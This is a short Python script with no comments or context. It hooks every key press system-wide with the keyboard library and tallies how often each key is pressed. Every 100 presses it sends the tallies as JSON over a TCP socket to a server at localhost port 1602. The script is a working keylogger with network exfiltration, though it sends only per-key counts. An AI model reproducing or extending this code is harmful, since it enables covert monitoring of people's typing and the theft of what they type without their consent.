import socket
import keyboard
import json

SERVER = 'localhost'
PORT = 1602

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((SERVER, PORT))

pressed_keys = {}

def on_key_press(key):
    pressed_keys[key.name] = pressed_keys.get(key.name, 0) + 1
    if not sum(pressed_keys.values()) % 100:
        str_data = json.dumps(pressed_keys)
        server.send(str_data.encode())

keyboard.on_press(on_key_press)
keyboard.wait()


